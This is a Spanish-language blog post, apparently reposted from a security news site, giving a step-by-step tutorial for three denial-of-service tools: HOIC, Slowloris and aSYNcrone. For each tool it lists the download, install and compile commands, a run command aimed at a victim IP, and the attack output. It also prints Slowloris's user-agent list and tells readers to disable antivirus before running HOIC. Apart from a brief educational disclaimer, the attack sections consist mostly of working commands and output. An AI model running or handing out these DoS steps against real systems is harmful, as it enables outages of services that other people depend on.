---
title: 'Herramientas para probar seguridad contra ataques DOS'
date: 2020-01-22T22:49:00+01:00
draft: false
---

[![](https://1.bp.blogspot.com/-LirXa0Uaicg/XijDfEC8E9I/AAAAAAAALqU/eWDyQI8t8OsZWoILB0jQyAszSTJJ2vpgQCLcBGAsYHQ/s640/tutorialDOS.jpg)](https://1.bp.blogspot.com/-LirXa0Uaicg/XijDfEC8E9I/AAAAAAAALqU/eWDyQI8t8OsZWoILB0jQyAszSTJJ2vpgQCLcBGAsYHQ/s1600/tutorialDOS.jpg)

  
La **[denegación de servicio](https://noticiasseguridad.com/vulnerabilidades/hackear-sitios-web-de-drupal-usando-archivos-tar-vulnerabilidad-critica/)** (DoS) es una variante de ataque muy popular que consiste en ralentizar la respuesta de una máquina o una dirección IP en específico; acorde a los especialistas en **[hacking ético](https://www.iicybersecurity.com/curso-hacking.html)** del Instituto Internacional de Seguridad Cibernética (IICS), existen decenas de vulnerabilidades conocidas para desplegar estos ataques, por lo que siguen siendo ampliamente utilizados por los hackers.

A continuación le mostraremos un listado con las herramientas de ataque DoS más populares. NOTA: No ejecute estas pruebas en sistemas de producción, este tutorial fue elaborado sólo con fines informativos y educativos.

**High Orbit Ion Cannon (HOIC)**

HOIC es la versión más reciente de LOIC Low Orbit Ion Cannon que se utiliza para atacar aplicaciones web. El usuario solo debe ingresar la dirección IP objetivo y seleccionar el número de los hilos, que son subprocesos que indican la cantidad de paquetes de datos que se enviarán durante el ataque, pudiendo generar gran daño.

Hemos probado esta herramienta en **_Windows 7 32 BIT Build Verison 7601_**. Especificaciones de hardware: CPU i5 7200 2.71 GHZ (Atacante – 10.10.11.17). Si el usuario establece una cantidad demasiado alta de hilos, HOIC se cerrará automáticamente.

**_Atacante – 10.10.11.17 =============== Víctima – 10.10.11.145_**

*   Descargar HOIC: https://sourceforge.net/projects/high-orbit-ion-cannon/
*   Antes de iniciar la prueba, deshabilite su antivirus

  

![](https://www.securitynewspaper.com/snews-up/2019/12/hoic.jpg)

  

*   A continuación se muestra otra máquina ataque usando Windows 7 64 Bit 7600 (Víctima – 10.10.11.145). Para verificar el uso del ancho de banda, hemos utilizado BitMeter OS
*   Descargue BitMeter OS: https://codebox.net/pages/bitmeteros-downloads
*   Antes del ataque DoS podemos ver que la CPU y los recursos de la víctima funcionaban normalmente

  

![](https://www.securitynewspaper.com/snews-up/2019/12/before_bitmeter_os-1024x447.jpg)

  

*   Después de ejecutar DOS usando HIOC, podemos ver la utilización de la máquina víctima con HOIC

  

![](https://www.securitynewspaper.com/snews-up/2019/12/bitmeter_os-1-1024x440.jpg)

  

*   Arriba se muestra un gran ancho de banda en la máquina objetivo, lo que hace que la memoria RAM y el CPU no respondan, pues todos los recursos se usaron por el alto nivel de transferencia de ancho de banda, mencionan los expertos en hacking ético
*   También puede consultar las estadísticas de ethernet utilizando Netstat. Abra CMD como administrador. Escriba **_netstat -e_**
*   Estadísticas antes del ataque:

  

![](https://www.securitynewspaper.com/snews-up/2019/12/Before_Ethernet_Stats.jpg)

  

*   Después de comenzar el ataque, las estadísticas de la interfaz aumentaron debido al alto tráfico:

  

![](https://www.securitynewspaper.com/snews-up/2019/12/After_Ethernet_Stats.jpg)

  

*   Las estadísticas de Ethernet muestran que el ancho de banda ha aumentado. Para comprobar el resto de estadísticas de la interfaz de las estadísticas de Ethernet, puede usar netstat –e

**Slowloris**

Slowloris es otra herramienta popular utilizada en ataques DoS, cuyos desarrolladores afirman es lenta pero efectiva. Slowloris está diseñado para enviar solicitudes HTTP al servidor objetivo, que se infesta de solicitudes GET., mencionan los expertos en hacking ético.

*   Para atacar usaremos **_Kali Linux 2018.4 amd64_**
*   Del lado de la víctima usaremos Windows 7 32 BIT Build Verison 7600 Especificaciones de hardware – CPU i5 7200 2.71 GHZ
*   Para verificar el estado de la víctima, usaremos **[Wireshark](https://noticiasseguridad.com/tecnologia/lanzan-wireshark-3-con-nuevo-controlador-de-captura-de-paquetes/)** en la máquina atacada
*   Para usar Slowloris, Python debe estar instalado
*   Para instalar Slowloris, escriba **_sudo apt-get update_**
*   Luego escriba **_sudo apt-get install python_**
*   Escriba **_git clone https://github.com/gkbrk/slowloris.git_**
*   Escriba **_sudo cd slowloris_** y luego escriba **_chmod u+x setup.py_**
*   Escriba **_python setup.py install_**
*   Escriba **_python slowloris_**

1

2

3

4

5

6

7

8

9

10

11

12

13

14

`root``@kali``:/home/iicybersecurity/slowloris``# python slowloris.py 10.10.11.123`

`[18-12-2019 00:18:22] Attacking 10.10.11.123 with 150 sockets.`

`[18-12-2019 00:18:22] Creating sockets…`

`[18-12-2019 00:18:22] Sending keep-alive headers… Socket count: 31`

`[18-12-2019 00:18:37] Sending keep-alive headers… Socket count: 1`

`[18-12-2019 00:18:52] Sending keep-alive headers… Socket count: 7`

`[18-12-2019 00:19:07] Sending keep-alive headers… Socket count: 1`

`[18-12-2019 00:19:22] Sending keep-alive headers… Socket count: 0`

`[18-12-2019 00:19:37] Sending keep-alive headers… Socket count: 2`

`[18-12-2019 00:19:52] Sending keep-alive headers… Socket count: 4`

`[18-12-2019 00:20:07] Sending keep-alive headers… Socket count: 6`

`[18-12-2019 00:20:22] Sending keep-alive headers… Socket count: 6`

`[18-12-2019 00:20:37] Sending keep-alive headers… Socket count: 1`

`[18-12-2019 00:20:52] Sending keep-alive headers… Socket count: 1`

*   Después de ejecutar el comando anterior. Slowloris comenzará a enviar paquetes de datos a la dirección IP objetivo
*   Arriba ya hemos configurado Wireshark para analizar la red local
*   A continuación se muestra la recepción de mucho tráfico en la máquina víctima

  

![](https://www.securitynewspaper.com/snews-up/2019/12/wireshark_capture-1024x546.png)

  

*   La captura de pantalla anterior indica que Wireshark ha capturado la recepción de paquetes de datos. Slowloris tiene algún impacto en la máquina objetivo
*   Slowloris puede ser bloqueado fácilmente por la máquina objetivo
*   A continuación se muestra la lista de agentes de usuario, que Slowloris utiliza para atacar en el servidor web

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

`list_of_sockets = []`

`user_agents = [`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"``,`

`"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"``,`

`"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"`

`"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"``,`

`"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"``,`

`"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"``,`

`"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"``,`

`"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"``,`

`"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"``,`

`"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"``,`

`]`

**ASYNCHRONE**

Asynchrone envía paquetes SYN a la dirección IP o al servidor web objetivo, lo que consume los recursos del servidor web atacado y hace que no responda. aSYNchrone está escrito en C.

*   Para las pruebas hemos usado Ubuntu 18.04
*   Y en el lado de la víctima, utilizaremos Windows 7 32 BIT Build Verison 7601 Hardware Specs – CPU i5 7200 2.71 GHZ
*   Abra el terminal y escriba **_git clone [https://github.com/fatih4842/aSYNcrone.git](https://github.com/fatih4842/aSYNcrone.git)_**

1

2

3

4

5

6

7

`root``@ubuntu``:/home/iicybersecurity/Downloads``# git clone https://github.com/fatih4842/aSYNcrone.git`

`Cloning into` `'aSYNcrone'``…`

`remote: Enumerating objects: 24, done.`

`remote: Counting objects: 100% (24/24), done.`

`remote: Compressing objects: 100% (21/21), done.`

`remote: Total 24 (delta 6), reused 11 (delta 2), pack-reused 0`

`Unpacking objects: 100% (24/24), done.`

*   Escriba **_cd aSYNchrone_**
*   Escriba **_gcc aSYNcrone.c -o aSYNcrone –lpthread_**

1

2

3

4

5

6

7

8

9

10

11

12

`root``@ubuntu``:/home/iicybersecurity/Downloads``# cd aSYNcrone/`

`root``@ubuntu``:/home/iicybersecurity/Downloads/aSYNcrone``# ls`

`aSYNcrone.c  README.md  src`

`root``@ubuntu``:/home/iicybersecurity/Downloads/aSYNcrone``# gcc aSYNcrone.c -o aSYNcrone -lpthread`

`aSYNcrone.c:` `In` `function` `‘bilgi’:`

`aSYNcrone.c:158:20: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘long unsigned int’ [-Wformat=]`

`printf(``"\n\nNumber of PACKETS: "``YSL``"%d"``RESET``" \t Attack Time: "``YSL``"%.2f"``RESET``" second \n\n"``RESET, p_sayi, zaman_farki);`

`^~~~~~~~~`

`aSYNcrone.c:158:50: note: format string is defined here`

`printf(``"\n\nNumber of PACKETS: "``YSL``"%d"``RESET``" \t Attack Time: "``YSL``"%.2f"``RESET``" second \n\n"``RESET, p_sayi, zaman_farki);`

`~^`

`%ld`

*   Después escriba **_./aSYNcrone 80 10.10.11.145 21 1000_**

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

`root``@ubuntu``:/home/iicybersecurity/Downloads/aSYNcrone``# ./aSYNcrone 80 10.10.11.145 21 1000`

`█████╗ ███████╗██╗   ██╗███╗   ██╗ ██████╗██████╗  ██████╗ ███╗   ██╗███████╗`

`██╔══██╗██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔════╝`

`███████║███████╗ ╚████╔╝ ██╔██╗ ██║██║     ██████╔╝██║   ██║██╔██╗ ██║█████╗`

`██╔══██║╚════██║  ╚██╔╝  ██║╚██╗██║██║     ██╔══██╗██║   ██║██║╚██╗██║██╔══╝`

`██║  ██║███████║   ██║   ██║ ╚████║╚██████╗██║  ██║╚██████╔╝██║ ╚████║███████╗`

`╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝`

`┌┐ ┬ ┬  ╦╔═┌─┐┬─┐┌─┐┌─┐┬  ┌┬┐┌─┐┌─┐  ╔═╗┬ ┬┌┐ ┌─┐┬─┐  ╔╦╗┌─┐┌─┐┌┬┐`

`├┴┐└┬┘  ╠╩╗├─┤├┬┘├─┤├┤ │  │││├─┤└─┐  ║  └┬┘├┴┐├┤ ├┬┘   ║ ├┤ ├─┤│││`

`└─┘ ┴   ╩ ╩┴ ┴┴└─┴ ┴└─┘┴─┘┴ ┴┴ ┴└─┘  ╚═╝ ┴ └─┘└─┘┴└─   ╩ └─┘┴ ┴┴ ┴`

`[+] IP_HDRINCL success!`

`[+] Attack has been started!`

`Number of PACKETS: 7624174       Attack Time: 148.00 second`

*   A continuación se muestra que el uso de ancho de banda por parte de la CPU era normal antes del ataque

  

![](https://www.securitynewspaper.com/snews-up/2019/12/Bit_Meter-OS-aSYNchone-1024x445.jpg)

  

*   Arriba se muestra que el ataque ha comenzado. Se puede ver un gran aumento en los recursos de las víctimas en Bitmeter OS. Investigadores de hacking ético del Instituto Internacional de Seguridad Cibernética (IICS) mencionan que estas herramientas son mejoradas por los hackers para generar más daño

  

![](https://www.securitynewspaper.com/snews-up/2019/12/bitmeter_os-task_manager-1024x439.jpg)

  

*   Arriba se muestra el alto ancho de banda y el alto uso de CPU y RAM de la computadora objetivo

  

Fuente: [https://noticiasseguridad.com/](https://noticiasseguridad.com/tutoriales/herramientas-para-probar-seguridad-contra-ataques-dos-tutorial-paso-por-paso/)

No olvides Compartir... 

  

Siguenos en twitter: [@disoftin](http://twitter.com/disoftin) - [@fredyavila](http://twitter.com/fredyavila)